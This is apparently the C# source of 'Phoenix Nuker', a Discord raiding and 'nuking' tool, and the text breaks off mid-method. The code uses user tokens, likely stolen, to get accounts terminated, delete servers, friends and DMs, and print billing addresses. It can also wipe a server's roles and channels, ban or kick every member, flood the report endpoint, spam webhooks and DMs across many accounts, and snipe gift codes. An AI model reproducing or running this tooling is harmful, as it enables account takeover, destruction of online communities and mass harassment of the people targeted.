﻿using System;
using System.IO;
using System.Net;
using System.Threading;
using Discord;
using Discord.Gateway;
using Leaf.xNet;
using Newtonsoft.Json;
using System.Drawing;
using Console = Colorful.Console;
using System.Net.Http;
using System.Diagnostics;
using System.Reflection;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System.Linq;
using System.Security.Cryptography;
using Org.BouncyCastle.Crypto.Engines;
using System.Text;
using System.Text.RegularExpressions;
using System.Collections.Generic;
using Newtonsoft.Json.Linq;

/* 
       │ Author       : extatent
       │ Name         : phoenix-nuker
       │ GitHub       : https://github.com/extatent
*/

namespace nuker
{
    class Program
    {
        #region Configs
        public static string version = "4";
        public static string APIVersion = "10";
        public static string token;
        public static int WaitTimeShort = 200;
        public static int WaitTimeLong = 2000;

        class config
        {
            public string token { get; set; }
        }

        public static void GetConfig()
        {
            StreamReader read = new StreamReader("config.json");
            string json = read.ReadToEnd();
            config config = JsonConvert.DeserializeObject<config>(json);
            token = config.token;
            read.Close();
        }

        public static void SaveConfig(string token)
        {
            config config = new config
            {
                token = token,
            };

            var responseData = config;
            string jsonData = JsonConvert.SerializeObject(responseData);
            File.WriteAllText("config.json", jsonData);
        }

        static DiscordSocketClient client = new DiscordSocketClient();
        static List<DiscordClient> clients = new List<DiscordClient>();
        static string guildid;
        #endregion

        #region Write Logo, Write Line
        static void WriteLogo()
        {
            Console.Clear();
            Console.WriteLine();
            Console.WriteLine();
            Console.WriteLine();
            string phoenix = @"                                  ██████╗ ██╗  ██╗ ██████╗ ███████╗███╗   ██╗██╗██╗  ██╗
                                  ██╔══██╗██║  ██║██╔═══██╗██╔════╝████╗  ██║██║╚██╗██╔╝
                                  ██████╔╝███████║██║   ██║█████╗  ██╔██╗ ██║██║ ╚███╔╝ 
                                  ██╔═══╝ ██╔══██║██║   ██║██╔══╝  ██║╚██╗██║██║ ██╔██╗ 
" + " > GitHub: github.com/extatent" + @"    ██║     ██║  ██║╚██████╔╝███████╗██║ ╚████║██║██╔╝ ██╗
" + " > Discord: discord.gg/FT9UZAxAhx " + @"╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝
                                                      ";
            Console.WriteWithGradient(phoenix, Color.OrangeRed, Color.Yellow, 16);
            Console.WriteLine();
            Console.WriteLine();
            Console.WriteLine();
        }
        #endregion

        #region Main
        static void Main(string[] args)
        {
            Console.Title = "Phoenix Nuker";
            CheckVersion();
            Start();
        }
        #endregion

        #region Update
        static void CheckVersion()
        {
            try
            {
                WebClient dw = new WebClient();

                if (dw.DownloadString("https://raw.githubusercontent.com/extatent/phoenix-nuker/main/version").Contains(version))
                {
                    int v2 = int.Parse(version) + 1;
                    Console.Title = "Phoenix Nuker | New version is available";
                    Console.Clear();
                    WriteLogo();
                    Console.WriteLine("New update is available: " + version + " > " + v2);
                    Console.WriteLine();
                    Console.WriteLine("Press any key to open Phoenix Nuker GitHub.");
                    Console.ReadKey();
                    Process.Start("https://github.com/extatent/phoenix-nuker/");
                    Environment.Exit(0);
                }
            }
            catch
            {
                Console.Clear();
                WriteLogo();
                Console.WriteLine("Please check your internet connection.");
                Console.ReadKey();
                Environment.Exit(0);
            }
        }
        #endregion

        #region Start
        static void Start()
        {
            WriteLogo();
            Console.ForegroundColor = Color.Yellow;
            string config = "config.json";
            if (!File.Exists(config))
            {
                try
                {
                    File.Create(config).Dispose();
                    File.WriteAllText(config, "{\"token\":\"\"}");
                }
                catch
                {
                    Environment.Exit(0);
                }
            }

            string tokens = "tokens.txt";
            if (!File.Exists(tokens))
            {
                try
                {
                    File.Create(tokens).Dispose();
                }
                catch
                {
                    Environment.Exit(0);
                }
            }

            GetConfig();

            try
            {
                Console.WriteLine("{0,-20} {1,34}", "[1] Login with user token", "[2] Login with your token");
                Console.WriteLine("{0,-20} {1,21}", "[3] MultiToken Raider", "[4] Exit");

                Console.WriteLine();
                Console.Write("Your choice: ");
                int options = int.Parse(Console.ReadLine());
                switch (options)
                {
                    default:
                        Console.WriteLine("Not a valid option.");
                        DoneMethod4();
                        break;
                    case 1:
                        if (string.IsNullOrEmpty(token))
                        {
                            try
                            {
                                Console.Clear();
                                WriteLogo();
                                Console.Write("Token: ");
                                string token = Console.ReadLine();

                                if (token.Contains("\""))
                                {
                                    token = token.Replace("\"", "");
                                }

                                SaveConfig(token);

                                client.Login(token);
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine(ex.Message);
                                Thread.Sleep(WaitTimeLong);
                                if (File.Exists("config.json"))
                                {
                                    File.Delete("config.json");
                                }
                                Start();
                            }
                        }
                        else
                        {
                            try
                            {
                                client.Login(token);
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine(ex.Message);
                                Thread.Sleep(WaitTimeLong);
                                if (File.Exists("config.json"))
                                {
                                    File.Delete("config.json");
                                }
                                Start();
                            }
                        }
                        break;
                    case 2:
                        try
                        {
                            client.Login(GetToken());
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                            Thread.Sleep(WaitTimeLong);
                            Start();
                        }
                        break;
                    case 3:
                        var TokenList = File.ReadAllLines("tokens.txt");

                        int count = 0;

                        foreach (var token in TokenList)
                        {
                            count++;

                            DiscordClient client = new DiscordClient(token);

                            clients.Add(client);
                        }
                        if (count == 0)
                        {
                            Console.Clear();
                            WriteLogo();
                            Console.WriteLine("Paste your tokens in tokens.txt file.");
                            Thread.Sleep(WaitTimeLong);
                            Start();
                        }
                        Console.Title = "Phoenix Nuker | Total Accounts: " + count;
                        Raider();
                        break;
                    case 4:
                        Environment.Exit(0);
                        break;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Thread.Sleep(WaitTimeLong);
                Start();
            }

            WriteLogo();
            Console.Title = $"Phoenix Nuker | {client.User}";

            try
            {
                Console.WriteLine("{0,-20} {1,34}", "[1] Account nuker", "[2] Server nuker");
                Console.WriteLine("{0,-20} {1,37}", "[3] Report bot", "[4] Webhook spammer");
                Console.WriteLine("{0,-20} {1,20}", "[5] Login to other account", "[6] Exit");

                Console.WriteLine();
                Console.Write("Your choice: ");
                int option = Convert.ToInt32(Console.ReadLine());
                switch (option)
                {
                    default:
                        Console.WriteLine("Not a valid option.");
                        DoneMethod4();
                        break;
                    case 1:
                        try
                        {
                            Console.Title = $"Phoenix Nuker | {client.User}";
                            Console.Clear();
                            AccountNuker();
                        }
                        catch
                        {
                            DoneMethod4();
                        }
                        break;
                    case 2:
                        Console.Clear();
                        WriteLogo();
                        try
                        {
                            if (string.IsNullOrEmpty(guildid))
                            {
                                Console.Write("Guild ID: ");
                                string GuildID = Console.ReadLine();
                                guildid = GuildID;
                            }
                            DiscordGuild guild = client.GetGuild(ulong.Parse(guildid));
                            Console.Title = $"Phoenix Nuker | {client.User} | {guild.Name}";
                            Console.Clear();
                            ServerNuker();
                        }
                        catch
                        {
                            DoneMethod4();
                        }
                        break;
                    case 3:
                        Console.Clear();
                        WriteLogo();
                        try
                        {
                            Console.Write("Guild ID: ");
                            string guildID = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Channel ID: ");
                            string channelid = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Message ID: ");
                            string messageid = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();
                            Console.WriteLine("[1] Illegal Content\n[2] Harrassment\n[3] Spam or Phishing Links\n[4] Self harm\n[5] NSFW");
                            Console.WriteLine();
                            Console.Write("Your choice: ");
                            string reason = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Reports count: ");
                            int count = int.Parse(Console.ReadLine());
                            Console.Clear();
                            WriteLogo();
                            HttpRequest httpRequest = new HttpRequest();
                            httpRequest.Authorization = token;
                            httpRequest.UserAgentRandomize();
                            string url = "https://discord.com/api/v10/report";

                            string jsonData = string.Concat(new string[]
                            {
                                "{\"channel_id\": \"",
                                channelid,
                                "\", \"guild_id\": \"",
                                guildID,
                                "\", \"message_id\": \"",
                                messageid,
                                "\", \"reason\": \"",
                                reason,
                                "\" }"
                            });

                            int reports = 0;
                            for (int i = 0; i < count; i++)
                            {
                                try
                                {
                                    HttpResponse response = httpRequest.Post(url, jsonData, "application/json");
                                    bool status = response.StatusCode.ToString() == "Created";
                                    if (status)
                                    {
                                        reports++;
                                        Console.WriteLine("Reports sent: " + reports);
                                    }

                                    Console.Title = $"Phoenix Nuker | {client.User} | Reports sent: " + reports.ToString();
                                }
                                catch
                                { }
                            }
                            Console.Title = $"Phoenix Nuker | {client.User}";
                        }
                        catch
                        {
                            DoneMethod4();
                        }
                        DoneMethod3();
                        break;
                    case 4:
                        Console.Clear();
                        WriteLogo();
                        try
                        {
                            Console.Write("Webhook: ");
                            string webhook = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Message: ");
                            string message = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Count: ");
                            string mcount = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();

                            int total = 0;
                            for (int i = 0; i < int.Parse(mcount); i++)
                            {
                                try
                                {
                                    total++;
                                    Webhook hook = new Webhook(webhook);
                                    hook.SendMessage(message);
                                    Console.WriteLine("Messages sent: " + total);
                                    Thread.Sleep(WaitTimeLong);
                                }
                                catch { }
                            }
                        }
                        catch
                        {
                            DoneMethod4();
                        }
                        DoneMethod3();
                        break;
                    case 5:
                        if (File.Exists("config.json"))
                        {
                            File.Delete("config.json");
                        }
                        Process.Start(Assembly.GetExecutingAssembly().Location);
                        Environment.Exit(0);
                        break;
                    case 6:
                        Environment.Exit(0);
                        break;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Thread.Sleep(WaitTimeLong);
                Start();
            }
        }
        #endregion

        #region Webhook class
        class Webhook
        {
            private HttpClient Client;
            private string Url;

            public Webhook(string webhookUrl)
            {
                Client = new HttpClient();
                Url = webhookUrl;
            }

            public bool SendMessage(string content)
            {
                MultipartFormDataContent data = new MultipartFormDataContent();
                data.Add(new System.Net.Http.StringContent("github.com/extatent"), "username");
                data.Add(new System.Net.Http.StringContent(content), "content");
                var resp = Client.PostAsync(Url, data).Result;
                return resp.StatusCode == System.Net.HttpStatusCode.NoContent;
            }
        }
        #endregion

        #region Done methods
        static void DoneMethod()
        {
            Console.WriteLine("Done");
            Thread.Sleep(WaitTimeLong);
            Console.Clear();
            AccountNuker();
        }

        static void DoneMethod2()
        {
            Console.WriteLine("Done");
            Thread.Sleep(WaitTimeLong);
            Console.Clear();
            ServerNuker();
        }

        static void DoneMethod3()
        {
            Console.WriteLine("Done");
            Thread.Sleep(WaitTimeLong);
            Console.Clear();
            Start();
        }

        static void DoneMethod4()
        {
            Thread.Sleep(WaitTimeLong);
            Console.Clear();
            Start();
        }

        static void DoneMethod5()
        {
            Console.WriteLine("Done");
            Thread.Sleep(WaitTimeLong);
            Console.Clear();
            Raider();
        }
        #endregion

        #region Raider
        static void Raider()
        {
            try
            {
                WriteLogo();

                Console.ForegroundColor = Color.Yellow;
                Console.WriteLine("{0,-20} {1,25}", "[1] Join Guild", "[2] Leave Guild");
                Console.WriteLine("{0,-20} {1,18}", "[3] Add Friend", "[4] Spam");
                Console.WriteLine("{0,-20} {1,24}", "[5] Add Reaction", "[6] Join Group");
                Console.WriteLine("{0,-20} {1,21}", "[7] Block User", "[8] DM User");
                Console.WriteLine("{0,-20} {1,24}", "[9] Leave Group", "[10] Fake Type");
                Console.WriteLine("{0,-20} {1,19}", "[11] Go Back", "[12] Exit");

                Console.WriteLine();
                Console.Write("Your choice: ");
                int option = Convert.ToInt32(Console.ReadLine());
                switch (option)
                {
                    default:
                        Console.WriteLine("Not a valid option.");
                        Thread.Sleep(WaitTimeLong);
                        Console.Clear();
                        Raider();
                        break;
                    case 1:
                        try
                        {
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Invite code: ");
                            string code = Console.ReadLine();
                            if (code.Contains("https://discord.gg/"))
                            {
                                code = code.Replace("https://discord.gg/", "");
                            }
                            if (code.Contains("https://discord.com/invite/"))
                            {
                                code = code.Replace("https://discord.com/invite/", "");
                            }
                            Console.Clear();
                            WriteLogo();
                            foreach (var joinguild in clients)
                            {
                                joinguild.JoinGuild(code);
                            }
                            DoneMethod4();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                            Thread.Sleep(WaitTimeLong);
                        }
                        Raider();
                        break;
                    case 2:
                        try
                        {
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Guild ID: ");
                            ulong id = ulong.Parse(Console.ReadLine());
                            Console.Clear();
                            WriteLogo();
                            foreach (var leaveguild in clients)
                            {
                                leaveguild.LeaveGuild(id);
                            }
                            DoneMethod4();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                            Thread.Sleep(WaitTimeLong);
                        }
                        Raider();
                        break;
                    case 3:
                        try
                        {
                            Console.Clear();
                            WriteLogo();
                            Console.Write("User ID: ");
                            ulong uid = ulong.Parse(Console.ReadLine());
                            Console.Clear();
                            WriteLogo();
                            foreach (var addfriend in clients)
                            {
                                addfriend.SendFriendRequest(uid);
                            }
                            DoneMethod4();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                            Thread.Sleep(WaitTimeLong);
                        }
                        Raider();
                        break;
                    case 4:
                        try
                        {
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Channel ID: ");
                            ulong cid = ulong.Parse(Console.ReadLine());
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Message: ");
                            string msg = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Count: ");
                            int count = int.Parse(Console.ReadLine());
                            Console.Clear();
                            WriteLogo();
                            for (int i = 0; i < count; i++)
                            {
                                foreach (var spam in clients)
                                {
                                    spam.SendMessage(cid, msg);
                                }
                            }
                            DoneMethod4();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                            Thread.Sleep(WaitTimeLong);
                        }
                        Raider();
                        break;
                    case 5:
                        try
                        {
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Channel ID: ");
                            ulong cid2 = ulong.Parse(Console.ReadLine());
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Message ID: ");
                            ulong mid = ulong.Parse(Console.ReadLine());
                            Console.Clear();
                            WriteLogo();
                            Console.WriteLine("[1] Heart\n[2] White Check Mark\n[3] Regional Indicator L\n[4] Regional Indicator W\n[5] Middle Finger\n[6] Billed Cap\n[7] Negative Squared Cross Mark");
                            Console.WriteLine();
                            Console.Write("Your choice: ");
                            string choice = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();
                            if (choice == "1")
                            {
                                foreach (var addreaction in clients)
                                {
                                    addreaction.AddMessageReaction(cid2, mid, "❤️");
                                }
                            }
                            if (choice == "2")
                            {
                                foreach (var addreaction in clients)
                                {
                                    addreaction.AddMessageReaction(cid2, mid, "✅");
                                }
                            }
                            if (choice == "3")
                            {
                                foreach (var addreaction in clients)
                                {
                                    addreaction.AddMessageReaction(cid2, mid, "🇱");
                                }
                            }
                            if (choice == "4")
                            {
                                foreach (var addreaction in clients)
                                {
                                    addreaction.AddMessageReaction(cid2, mid, "🇼");
                                }
                            }
                            if (choice == "5")
                            {
                                foreach (var addreaction in clients)
                                {
                                    addreaction.AddMessageReaction(cid2, mid, "🖕");
                                }
                            }
                            if (choice == "6")
                            {
                                foreach (var addreaction in clients)
                                {
                                    addreaction.AddMessageReaction(cid2, mid, "🧢");
                                }
                            }
                            if (choice == "7")
                            {
                                foreach (var addreaction in clients)
                                {
                                    addreaction.AddMessageReaction(cid2, mid, "❎");
                                }
                            }
                            DoneMethod4();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                            Thread.Sleep(WaitTimeLong);
                        }
                        Raider();
                        break;
                    case 6:
                        try
                        {
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Invite code: ");
                            string inv = Console.ReadLine();
                            if (inv.Contains("https://discord.gg/"))
                            {
                                inv = inv.Replace("https://discord.gg/", "");
                            }
                            if (inv.Contains("https://discord.com/invite/"))
                            {
                                inv = inv.Replace("https://discord.com/invite/", "");
                            }
                            Console.Clear();
                            WriteLogo();
                            foreach (var joingroup in clients)
                            {
                                joingroup.JoinGroup(inv);
                            }
                            DoneMethod4();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                            Thread.Sleep(WaitTimeLong);
                        }
                        Raider();
                        break;
                    case 7:
                        try
                        {
                            Console.Clear();
                            WriteLogo();
                            Console.Write("User ID: ");
                            ulong uid2 = ulong.Parse(Console.ReadLine());
                            Console.Clear();
                            WriteLogo();
                            foreach (var blockuser in clients)
                            {
                                blockuser.BlockUser(uid2);
                            }
                            DoneMethod4();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                            Thread.Sleep(WaitTimeLong);
                        }
                        Raider();
                        break;
                    case 8:
                        try
                        {
                            Console.Clear();
                            WriteLogo();
                            Console.Write("User ID: ");
                            ulong uid3 = ulong.Parse(Console.ReadLine());
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Message: ");
                            string msg2 = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();
                            foreach (var dmuser in clients)
                            {
                                PrivateChannel channel = dmuser.CreateDM(uid3);
                                dmuser.SendMessage(channel, msg2);
                            }
                            DoneMethod4();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                            Thread.Sleep(WaitTimeLong);
                        }
                        Raider();
                        break;
                    case 9:
                        try
                        {
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Group ID: ");
                            ulong gid = ulong.Parse(Console.ReadLine());
                            Console.Clear();
                            WriteLogo();
                            foreach (var leavegroup in clients)
                            {
                                leavegroup.LeaveGroup(gid);
                            }
                            DoneMethod4();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                            Thread.Sleep(WaitTimeLong);
                        }
                        Raider();
                        break;
                    case 10:
                        try
                        {
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Channel ID: ");
                            ulong cid = ulong.Parse(Console.ReadLine());
                            Console.Clear();
                            WriteLogo();
                            foreach (var faketype in clients)
                            {
                                faketype.TriggerTyping(cid);
                            }
                            DoneMethod4();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                            Thread.Sleep(WaitTimeLong);
                        }
                        Raider();
                        break;
                    case 11:
                        Start();
                        break;
                    case 12:
                        Environment.Exit(0);
                        break;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Thread.Sleep(WaitTimeLong);
                Raider();
            }
        }
        #endregion

        #region Account nuker
        static void AccountNuker()
        {
            WriteLogo();

            Console.ForegroundColor = Color.Yellow;
            Console.WriteLine("{0,-20} {1,33}", "[1] Terminate Account", "[2] Leave/Delete Guilds");
            Console.WriteLine("{0,-20} {1,27}", "[3] Clear Relationships", "[4] Leave HypeSquad");
            Console.WriteLine("{0,-20} {1,29}", "[5] Remove Connections", "[6] Deauthorize Apps");
            Console.WriteLine("{0,-20} {1,25}", "[7] Mass Create Guilds", "[8] Seizure Mode");
            Console.WriteLine("{0,-20} {1,23}", "[9] Confuse Mode", "[10] Mass DM");
            Console.WriteLine("{0,-20} {1,35}", "[11] User Info", "[12] Block Relationships");
            Console.WriteLine("{0,-20} {1,26}", "[13] Nitro Sniper", "[14] Delete DMs");
            Console.WriteLine("{0,-20} {1,20}", "[15] Go Back", "[16] Exit");

            Console.WriteLine();
            Console.Write("Your choice: ");
            int option = Convert.ToInt32(Console.ReadLine());
            switch(option)
            {
                default:
                    Console.WriteLine("Not a valid option.");
                    Thread.Sleep(WaitTimeLong);
                    Console.Clear();
                    AccountNuker();
                    break;
                case 1:
                    try
                    {
                        while (true)
                        {
                            using (HttpRequest req = new HttpRequest())
                            {
                                req.AddHeader("Authorization", token);
                                req.Post("https://discord.com/api/v10/invites/terraria");
                                req.Post("https://discord.com/api/v10/invites/phasmophobia");
                                req.Post("https://discord.com/api/v10/invites/brackeys");
                            }
                        }
                    }
                    catch 
                    { }
                    break;
                case 2:
                    foreach (var guild in client.GetGuilds())
                    {
                        try
                        {
                            if (guild.Owner)
                            {
                                guild.Delete();
                            }
                            else
                            {
                                guild.Leave();
                            }
                            Thread.Sleep(WaitTimeShort);
                        }
                        catch { }
                    }
                    DoneMethod();
                    break;
                case 3:
                    try
                    {
                        Console.Clear();
                        WriteLogo();

                        using (HttpRequest req = new HttpRequest())
                        {
                            req.AddHeader("Authorization", token);
                            HttpResponse channelid = req.Get("https://discord.com/api/v" + APIVersion + "/users/@me/relationships");
                            var array = JArray.Parse(channelid.ToString());
                            req.Close();
                            foreach (dynamic entry in array)
                            {
                                req.AddHeader("Authorization", token);
                                req.Delete("https://discord.com/api/v" + APIVersion + "/users/@me/relationships/" + entry.id);
                                Console.WriteLine("Removed: " + entry.user.username + "#" + entry.user.discriminator);
                                Thread.Sleep(WaitTimeShort);
                            }
                        }
                    }
                    catch
                    { }
                    DoneMethod();
                    break;
                case 4:
                    client.User.SetHypesquad(Hypesquad.None);
                    client.User.Update();
                    DoneMethod();
                    break;
                case 5:
                    foreach (var connections in client.GetConnectedAccounts())
                    {
                        try
                        {
                            connections.Remove();
                            Thread.Sleep(WaitTimeShort);
                        }
                        catch
                        { }
                    }
                    DoneMethod();
                    break;
                case 6:
                    foreach (var apps in client.GetAuthorizedApps())
                    {
                        try
                        {
                            apps.Deauthorize();
                            Thread.Sleep(WaitTimeShort);
                        }
                        catch
                        { }
                    }
                    DoneMethod();
                    break;
                case 7:
                    try
                    {
                        Console.Clear();
                        WriteLogo();
                        Console.Write("Guild name: ");
                        string name = Console.ReadLine();
                        Console.Clear();
                        WriteLogo();
                        Console.Write("Count (max 100): ");
                        int count = int.Parse(Console.ReadLine());
                        Console.Clear();
                        WriteLogo();

                        for (int i = 0; i < count; i++)
                        {
                            client.CreateGuild(name);
                            Thread.Sleep(WaitTimeShort);
                        }

                    }
                    catch
                    { }
                    DoneMethod();
                    break;
                case 8:
                    try
                    {
                        Console.Clear();
                        WriteLogo();
                        Console.Write("Count: ");
                        string count = Console.ReadLine();
                        Console.Clear();
                        WriteLogo();

                        for (int i = 0; i < int.Parse(count); i++)
                        {
                            try
                            {
                                client.User.ChangeSettings(new UserSettingsProperties() { Theme = DiscordTheme.Light });
                                Thread.Sleep(WaitTimeShort);
                                client.User.ChangeSettings(new UserSettingsProperties() { Theme = DiscordTheme.Dark });
                                Thread.Sleep(WaitTimeShort);
                            }
                            catch { }
                        }
                    }
                    catch
                    { }
                    DoneMethod();
                    break;
                case 9:
                    try
                    {
                        client.User.ChangeSettings(new UserSettingsProperties() { 
                            Language = DiscordLanguage.Chinese, 
                            Theme = DiscordTheme.Light, 
                            DeveloperMode = false,
                            EnableTts = true, 
                            CompactMessages = true, 
                            ExplicitContentFilter = ExplicitContentFilter.DoNotScan 
                        });
                    }
                    catch
                    { }
                    DoneMethod();
                    break;
                case 10:
                    Console.Clear();
                    WriteLogo();
                    Console.Write("Message: ");
                    string message = Console.ReadLine();
                    Console.Clear();
                    WriteLogo();

                    foreach (var relationship in client.GetRelationships())
                    {
                        if (relationship.Type == RelationshipType.Friends)
                        {
                            try
                            {
                                PrivateChannel channel = client.CreateDM(relationship.User.Id);
                                client.SendMessage(channel, message);
                                Thread.Sleep(WaitTimeShort);
                            }
                            catch
                            { }
                        }
                    }
                    foreach (var dms in client.GetPrivateChannels())
                    {
                        try
                        {
                            dms.SendMessage(message);
                            Thread.Sleep(WaitTimeShort);
                        }
                        catch
                        { }
                    }
                    DoneMethod();
                    break;
                case 11:
                    try
                    {
                        Console.Clear();
                        WriteLogo();

                        Console.WriteLine("\nSubscription Info:");
                        Console.WriteLine("Nitro: " + client.GetClientUser().Nitro + "\nNitro since: " + client.GetClientUser().GetProfile().NitroSince + "\nBoost slots: " + client.GetBoostSlots().Count);
                        Console.WriteLine("\nPayment Info:");
                        foreach (var paymentMethod in client.GetPaymentMethods())
                        {
                           
                            Console.WriteLine("ID: " + paymentMethod.Id + "\nInvalid: " + paymentMethod.Invalid + "\nAddress 1: " + paymentMethod.BillingAddress.Address1 + "\nAddress 2: " + paymentMethod.BillingAddress.Address2 + "\nCity: " + paymentMethod.BillingAddress.City + "\nCountry: " + paymentMethod.BillingAddress.Country + "\nPostal Code: " + paymentMethod.BillingAddress.PostalCode + "\nState: " + paymentMethod.BillingAddress.State + "\n");
                        }
                        Console.WriteLine("\nAccount Info:");
                        Console.WriteLine("ID: " + client.GetClientUser().Id + "\nEmail: " + client.GetClientUser().Email + "\nPhone number: " + client.GetClientUser().PhoneNumber  + "\nRegistered at: " + client.GetClientUser().CreatedAt + "\nRegistration language: " + client.GetClientUser().RegistrationLanguage + "\nGuilds count: " + client.GetCachedGuilds().Count + "\nFriends count: " + client.GetRelationships().Count + "\nDMs count: " + client.GetPrivateChannels().Count + "\nBadges: " + client.GetClientUser().Badges);
                        Console.WriteLine("\nPress any key to go back.");
                        Console.ReadKey();
                        Console.Clear();
                        AccountNuker();
                    }
                    catch
                    { }
                    break;
                case 12:
                    foreach (var relationship in client.GetRelationships())
                    {
                        try
                        {
                            client.BlockUser(relationship.User.Id);
                            Thread.Sleep(WaitTimeShort);
                        }
                        catch
                        { }
                    }
                    DoneMethod();
                    break;
                case 13:
                    Console.Clear();
                    WriteLogo();
                    client.OnMessageReceived += Client_OnMessageReceived;
                    Console.WriteLine("Nitro Sniper is on. Don't close the program to keep it working (optionally use a VPS).\nYou will be notified whenever you will get nitro. Press any key to close the program.\n");
                    Console.ReadKey();
                    Environment.Exit(0);
                    break;
                case 14:
                    try
                    {
                        using (HttpRequest req = new HttpRequest())
                        {
                            req.AddHeader("Authorization", token);
                            HttpResponse channelid = req.Get("https://discord.com/api/v" + APIVersion + "/users/@me/channels");
                            var array = JArray.Parse(channelid.ToString());
                            req.Close();
                            foreach (dynamic entry in array)
                            {
                                req.AddHeader("Authorization", token);
                                req.Delete("https://discord.com/api/v" + APIVersion + "/channels/" + entry.id);
                                Console.WriteLine("Deleted: " + entry.recipients[0].username + "#" + entry.recipients[0].discriminator);
                                Thread.Sleep(WaitTimeShort);
                            }
                        }
                    }
                    catch
                    { }
                    DoneMethod();
                    break;
                case 15:
                    Start();
                    break;
                case 16:
                    Environment.Exit(0);
                    break;
            }
        }
        #endregion

        #region Nitro Sniper
        static void Client_OnMessageReceived(DiscordSocketClient client, MessageEventArgs args)
        {
            try
            {
                const string prefix = "discord.gift/";

                var match = Regex.Match(args.Message.Content, prefix + ".{16,24}");

                if (match.Success)
                {
                    string code = match.Value.Substring(match.Value.IndexOf(prefix) + prefix.Length);

                    client.RedeemGift(code);

                    Console.WriteLine("The code " + code + " was successfully redeemed.");
                }
            }
            catch (Exception ex)
            { 
                Console.WriteLine(ex.Message); 
            }
        }
        #endregion

        #region Server Nuker
        static void ServerNuker()
        {
            WriteLogo();

            Console.ForegroundColor = Color.Yellow;
            Console.WriteLine("{0,-20} {1,30}", "[1] Delete All Roles", "[2] Remove All Bans");
            Console.WriteLine("{0,-20} {1,29}", "[3] Delete All Channels", "[4] Delete All Emojis");
            Console.WriteLine("{0,-20} {1,30}", "[5] Delete All Invites", "[6] Mass Create Roles");
            Console.WriteLine("{0,-20} {1,26}", "[7] Mass Create Channels", "[8] Ban All Members");
            Console.WriteLine("{0,-20} {1,23}", "[9] Kick All Members", "[10] Mass DM");
            Console.WriteLine("{0,-20} {1,28}", "[11] Server Info", "[12] Leave Server");
            Console.WriteLine("{0,-20} {1,18}", "[13] Msg in every channel", "[14] Go Back");
            Console.WriteLine("[15] Exit");

            Console.WriteLine();
            Console.Write("Your choice: ");
            int option = Convert.ToInt32(Console.ReadLine());
            DiscordGuild guild = client.GetGuild(ulong.Parse(guildid));
            switch(option)
            {
                default:
                    Console.WriteLine("Not a valid option.");
                    Thread.Sleep(WaitTimeLong);
                    Console.Clear();
                    ServerNuker();
                    break;
                case 1:
                    foreach (var roles in guild.GetRoles())
                    {
                        try
                        {
                            roles.Delete();
                            Thread.Sleep(WaitTimeShort);
                        }
                        catch { }
                    }
                    DoneMethod2();
                    break;
                case 2:
                    foreach (var bans in guild.GetBans())
                    {
                        try
                        {
                            bans.Unban();
                            Thread.Sleep(WaitTimeShort);
                        }
                        catch { }
                    }
                    DoneMethod2();
                    break;
                case 3:
                    foreach (var channels in guild.GetChannels())
                    {
                        try
                        {
                            channels.Delete();
                            Thread.Sleep(WaitTimeShort);
                        }
                        catch { }
                    }
                    DoneMethod2();
                    break;
                case 4:
                    foreach (var emojis in guild.GetEmojis())
                    {
                        try
                        {
                            emojis.Delete();
                            Thread.Sleep(WaitTimeShort);
                        }
                        catch { }
                    }
                    DoneMethod2();
                    break;
                case 5:
                    foreach (var invites in guild.GetInvites())
                    {
                        try
                        {
                            invites.Delete();
                            Thread.Sleep(WaitTimeShort);
                        }
                        catch { }
                    }
                    DoneMethod2();
                    break;
                case 6:
                    try
                    {
                        Console.Clear();
                        WriteLogo();
                        Console.Write("Role name: ");
                        string name = Console.ReadLine();
                        Console.Clear();
                        WriteLogo();
                        Console.Write("Count (max 250): ");
                        int count = int.Parse(Console.ReadLine());
                        Console.Clear();
                        WriteLogo();

                        for (int i = 0; i < count; i++)
                        {
                            try
                            {
                                guild.CreateRole(new RoleProperties()
                                {
                                    Name = name
                                });

                                Thread.Sleep(WaitTimeShort);
                            }
                            catch { }
                        }
                    }
                    catch
                    { }
                    DoneMethod2();
                    break;
                case 7:
                    try
                    {
                        Console.Clear();
                        WriteLogo();
                        Console.Write("Channel name: ");
                        string name = Console.ReadLine();
                        Console.Clear();
